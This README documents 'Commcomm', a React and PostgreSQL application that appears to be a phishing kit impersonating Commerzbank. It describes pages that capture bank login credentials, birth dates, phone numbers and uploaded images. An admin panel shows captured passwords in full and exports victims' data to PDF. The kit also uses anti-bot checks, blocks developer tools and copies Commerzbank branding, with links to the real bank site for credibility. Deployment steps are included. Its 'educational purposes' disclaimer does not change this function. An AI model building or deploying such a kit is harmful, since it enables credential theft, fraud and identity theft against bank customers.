
# Commcomm Application

A comprehensive React.js application with PostgreSQL backend, featuring multi-step form processing, advanced admin panel, and secure data collection with visitor tracking.

## 🚀 Features

### **Core Functionality**
- **Captcha security**: Anti-bot protection with math verification before login
- **Multi-step form process**: Captcha → Login → Information → Upload → Done
- **Direct file upload**: Streamlined upload process with immediate processing
- **Session management**: Data persistence across pages with unique session IDs
- **Database integration**: PostgreSQL with Prisma ORM
- **File upload**: Image file upload with validation and preview
- **Visitor tracking**: Page visit monitoring and analytics

### **Advanced Admin Panel**
- **Real-time dashboard**: Live statistics and user data monitoring
- **User details view**: Complete user information with image preview
- **PDF export**: Individual and bulk user data export with embedded images
- **Password visibility**: Full password display in admin interface
- **Session management**: Delete, view, and track user sessions
- **Auto-refresh**: Real-time updates every 10 seconds
- **German interface**: Fully localized admin panel

### **Security & UX Features**
- **Captcha verification**: Math-based security check (3 + 4 = ?) before login access
- **Anti-bot protection**: IP tracking, developer tools blocking
- **External redirects**: All links redirect to official Commerzbank website
- **Responsive design**: Mobile-friendly interface for all devices including xsm
- **Professional styling**: Commerzbank brand colors and design
- **Error handling**: Graceful error management and user feedback
- **Production ready**: Complete deployment setup for AMD64 systems


## Project Structure

```
Commcomm-main/
├── src/
│   ├── components/
│   │   ├── CaptchaPage.tsx    # Captcha security verification
│   │   ├── LoginPage.tsx      # Login form
│   │   ├── InfoPage.tsx       # Personal information form
│   │   ├── UploadPage.tsx     # File upload form
│   │   ├── DonePage.tsx       # Success page
│   │   ├── AdminPanel.tsx     # Admin dashboard
│   │   └── SecurityScript.tsx # Security and anti-bot features
│   ├── services/
│   │   └── api.ts            # API service layer
│   ├── App.tsx               # Main app component with routing
│   ├── App.css               # Styling
│   └── index.tsx             # Entry point
├── backend/
│   ├── server.js             # Express.js backend server
│   ├── database.js           # Database service with Prisma
│   ├── package.json          # Backend dependencies
│   ├── uploads/              # File upload directory
│   └── .env                  # Environment variables
├── prisma/
│   └── schema.prisma         # Database schema
├── deploy-amd.sh             # AMD deployment script
├── deployment-config.json    # Deployment configuration
├── DEPLOYMENT.md             # Deployment guide
└── package.json              # Frontend dependencies
```

## Setup Instructions

### Prerequisites

- **Node.js** (v16 or higher)
- **npm** or **yarn**
- **PostgreSQL** (v15 or higher)
- **Git**

### Quick Start (Development)

1. **Clone the repository:**
   ```bash
   git clone <repository-url>
   cd Commcomm-main
   ```

2. **Install frontend dependencies:**
   ```bash
   npm install
   ```

3. **Install backend dependencies:**
   ```bash
   cd backend
   npm install
   cd ..
   ```

4. **Setup PostgreSQL database:**
   ```bash
   # Create database
   createdb commcomm_db
   
   # Or using PostgreSQL client
   psql -c "CREATE DATABASE commcomm_db;"
   ```

5. **Configure environment variables:**
   ```bash
   # Create backend/.env file
   cp backend/.env.example backend/.env
   # Edit the .env file with your database credentials
   ```

6. **Setup database schema:**
   ```bash
   cd backend
   npx prisma generate
   npx prisma db push
   cd ..
   ```

7. **Start the application:**
   ```bash
   # Terminal 1 - Backend
   cd backend && npm start
   
   # Terminal 2 - Frontend
   npm start
   ```

- **Frontend**: `http://localhost:3000` (starts with captcha page)
- **Backend API**: `http://localhost:3001`
- **Admin Panel**: `http://localhost:3000/admin`

### Production Build

To build the React app for production:

```bash
npm run build
```

## Environment Variables

### Backend Configuration (`backend/.env`)

```bash
# Database Configuration
DATABASE_URL="postgresql://username:password@localhost:5432/commcomm_db?schema=public"

# Server Configuration
NODE_ENV=production
PORT=3001

# Security Keys (CHANGE THESE IN PRODUCTION!)
JWT_SECRET="your-super-secret-jwt-key-change-this-in-production"
SESSION_SECRET="your-super-secret-session-key-change-this-in-production"

# File Upload Configuration
MAX_FILE_SIZE=10485760
UPLOAD_PATH="./uploads"

# Admin Panel Credentials (CHANGE THESE!)
ADMIN_USERNAME="admin"
ADMIN_PASSWORD="admin123"
```

### Frontend Configuration

Create a `.env` file in the root directory:

```bash
# API Configuration
REACT_APP_API_URL=http://localhost:3001/api

# For production, use your domain:
# REACT_APP_API_URL=https://your-domain.com/api
```

## API Endpoints

### Public Endpoints
- `POST /api/login` - Handle login form submission
- `POST /api/info` - Handle personal information submission
- `POST /api/upload` - Handle file upload with session tracking
- `POST /api/final` - Handle final data submission and session completion
- `GET /api/health` - Health check endpoint

### Admin Endpoints (Protected)
- `POST /api/admin/login` - Admin authentication
- `GET /api/admin/user-data` - Retrieve all user sessions with complete data
- `GET /api/admin/stats` - Get application statistics and session counts
- `GET /api/admin/visitors` - Get visitor analytics and page visits
- `DELETE /api/admin/delete-data/:sessionId` - Delete specific session data
- `POST /api/admin/fix-incomplete-sessions` - Fix sessions missing final data

## Security Features

The application includes the same security features as the original PHP version:

- **Developer tools blocking**: Prevents F12, Ctrl+Shift+I, etc.
- **Right-click prevention**: Disables context menu
- **Text selection blocking**: Prevents text selection
- **Copy/paste prevention**: Blocks clipboard operations
- **Drag prevention**: Disables element dragging
- **Console protection**: Blocks developer console access

## Data Collection

The application collects the following data:

1. **Login credentials**: Username and password (fully visible in admin)
2. **Personal information**: First name, last name, birth date, phone number
3. **File uploads**: Image files (JPG, PNG, GIF) with preview and metadata
4. **System information**: IP address, user agent, timestamp, session ID
5. **Session tracking**: Complete user journey from login to completion
6. **Technical data**: Browser information, file sizes, upload timestamps

### Data Flow
- **Captcha Page**: Security verification with math problem (3 + 4 = ?)
- **Login Page**: Captures credentials and creates session
- **Info Page**: Collects personal information
- **Upload Page**: Handles file upload with direct processing
- **Done Page**: Marks session as completed and submits final data
- **Admin Panel**: Provides complete visibility and export capabilities

## Configuration

### Environment Variables

Create a `.env` file in the react-app directory:

```
REACT_APP_API_URL=http://localhost:3001/api
```

### Backend Configuration

The backend server can be configured by modifying the `server.js` file:

- Change the port by setting the `PORT` environment variable
- Modify file upload limits in the multer configuration
- Add additional security measures as needed

## Development

### Adding New Features

1. Create new components in the `src/components/` directory
2. Add new API endpoints in the backend `server.js`
3. Update the routing in `App.tsx` if needed
4. Add corresponding API methods in `src/services/api.ts`

### Styling

The application uses CSS modules and custom CSS. Main styles are in `App.css`. The styling maintains the Commerzbank brand appearance.

## Production Deployment

### AMD64 Deployment (Recommended)

For production deployment on AMD64 systems (Ubuntu 22.04 LTS):

1. **Run the automated deployment script:**
   ```bash
   chmod +x deploy-amd.sh
   ./deploy-amd.sh
   ```

2. **Manual deployment steps:**
   - Follow the detailed guide in `DEPLOYMENT.md`
   - Configure your domain name
   - Setup SSL certificates
   - Update admin credentials

### Manual Production Setup

1. **Build the frontend:**
   ```bash
   npm run build
   ```

2. **Setup production environment:**
   ```bash
   # Create production .env file
   cp backend/.env.example backend/.env
   # Update with production values
   ```

3. **Install production dependencies:**
   ```bash
   cd backend
   npm install --production
   ```

4. **Setup database:**
   ```bash
   npx prisma generate
   npx prisma db push
   ```

5. **Start with PM2:**
   ```bash
   npm install -g pm2
   pm2 start server.js --name commcomm-backend
   pm2 startup
   pm2 save
   ```

### Production Environment Variables

**IMPORTANT**: Change these default values in production:

```bash
# Database (use strong password)
DATABASE_URL="postgresql://commcomm_user:STRONG_PASSWORD@localhost:5432/commcomm_db"

# Security (generate strong secrets)
JWT_SECRET="generate-a-very-long-random-string-here"
SESSION_SECRET="generate-another-very-long-random-string-here"

# Admin credentials (change these!)
ADMIN_USERNAME="your_admin_username"
ADMIN_PASSWORD="your_strong_admin_password"
```

### Security Checklist

- [ ] Change default admin credentials
- [ ] Generate strong JWT and session secrets
- [ ] Use strong database password
- [ ] Enable SSL/HTTPS
- [ ] Configure firewall (UFW)
- [ ] Setup fail2ban
- [ ] Regular security updates
- [ ] Monitor logs
- [ ] Backup strategy

## Admin Panel

The application includes a comprehensive admin panel accessible at `/admin`:

### 🎯 Core Features
- **Real-time dashboard** with live statistics and session counts
- **User data management** with complete session tracking
- **Visitor analytics** and page visit monitoring
- **Auto-refresh** functionality (updates every 10 seconds)
- **Responsive design** for mobile access

### 👁️ User Details View
- **Eye icon button** for each user session
- **Complete user information** display in German
- **Image preview** of uploaded files
- **Technical details** (IP, browser, timestamps)
- **PDF download** for individual user data

### 📄 PDF Export Features
- **Individual user PDF**: Download single user details with embedded image
- **Bulk user PDF**: Download all users' data in comprehensive multi-page PDF
- **Professional formatting**: Clean, organized German documents
- **Image integration**: All uploaded images embedded in PDFs

### 🔓 Data Visibility
- **Full password visibility** in main table and exports
- **Complete session data** including all form submissions
- **File upload tracking** with original filenames and sizes
- **Session completion status** with automatic final data submission

### Default Admin Credentials
```
Username: admin
Password: admin123
```

**⚠️ IMPORTANT**: Change these credentials immediately in production!

## Database Schema

The application uses PostgreSQL with the following main tables:

- **UserSession**: Main session tracking
- **LoginData**: User login credentials
- **InfoData**: Personal information
- **UploadData**: File upload records
- **FinalData**: Complete session data
- **Visitor**: Page visit tracking

## Monitoring and Logs

### Application Logs
```bash
# View application logs
sudo journalctl -u commcomm -f

# View Nginx logs
sudo tail -f /var/log/nginx/error.log
sudo tail -f /var/log/nginx/access.log

# View PostgreSQL logs
sudo tail -f /var/log/postgresql/postgresql-15-main.log
```

### Health Checks
```bash
# Check service status
sudo systemctl status commcomm postgresql nginx

# Test API endpoints
curl http://localhost:3001/api/health
curl http://localhost:3001/api/admin/stats
```

## Troubleshooting

### Common Issues

1. **Database connection errors**: Check PostgreSQL service and credentials
2. **File upload issues**: Verify upload directory permissions and unique constraint handling
3. **Admin panel access**: Ensure correct credentials and session
4. **SSL certificate problems**: Verify domain configuration and Let's Encrypt setup
5. **Session completion issues**: Use `/api/admin/fix-incomplete-sessions` endpoint
6. **PDF generation errors**: Ensure jsPDF library is installed and images are accessible

### Recent Fixes Applied
- **Upload flow**: Fixed direct file upload with proper session handling
- **Database constraints**: Resolved unique constraint errors with upsert operations
- **Session completion**: Automatic final data submission on Done page
- **Admin panel**: Enhanced with view dialog, PDF export, and password visibility
- **External links**: All navigation links redirect to Commerzbank website

### Support Files
- `DEPLOYMENT.md` - Detailed deployment guide
- `deployment-config.json` - Configuration reference
- `deploy-amd.sh` - Automated deployment script

## Security Notes

- All data is encrypted in transit (HTTPS)
- Session management with unique IDs
- IP tracking and visitor monitoring
- Anti-bot protection measures
- Secure file upload validation
- Admin panel authentication required

## Recent Updates & Improvements

### ✅ Completed Features (Latest Version)

#### **Frontend Enhancements**
- **Captcha Security**: Math-based verification (3 + 4 = ?) before login access
- **Fixed Upload Flow**: Direct file upload with immediate processing
- **Streamlined UI**: Removed debug information and unnecessary elements
- **External Redirects**: All links redirect to official Commerzbank website
- **Professional Styling**: Consistent Commerzbank branding and colors
- **Responsive Design**: Optimized for all device sizes including xsm devices

#### **Admin Panel Upgrades**
- **User Details View**: Eye icon button with complete user information dialog
- **PDF Export System**: Individual and bulk user data export with images
- **Password Visibility**: Full password display in table and exports
- **German Localization**: Complete German interface for admin panel
- **Auto-refresh**: Real-time updates every 10 seconds
- **Enhanced Statistics**: Accurate session completion tracking

#### **Backend Improvements**
- **Database Fixes**: Resolved unique constraint errors with upsert operations
- **Session Management**: Automatic final data submission and completion tracking
- **API Enhancements**: New endpoint for fixing incomplete sessions
- **Error Handling**: Improved error management and logging
- **File Processing**: Enhanced file upload with proper validation

#### **Technical Fixes**
- **Captcha Implementation**: Math verification system with error handling
- **Upload Process**: Fixed broken upload flow with direct processing
- **Session Completion**: Automatic marking of completed sessions
- **Data Integrity**: Proper handling of database constraints
- **PDF Generation**: jsPDF integration with image embedding
- **External Linking**: Secure external redirects with proper attributes
- **React Error Fixes**: Resolved DOM manipulation issues in captcha component

### 🎯 Current Status
- **Frontend**: ✅ Fully functional with all features working
- **Backend**: ✅ All API endpoints operational
- **Database**: ✅ Proper schema with constraint handling
- **Admin Panel**: ✅ Complete with PDF export and user management
- **File Upload**: ✅ Direct upload with session tracking
- **Captcha Security**: ✅ Math verification system implemented
- **Responsive Design**: ✅ Optimized for all devices including xsm
- **Security**: ✅ All security features active

## License

This project is for educational and development purposes. Please ensure compliance with local laws and regulations regarding data collection and privacy.

**Developed by hasnain babar**
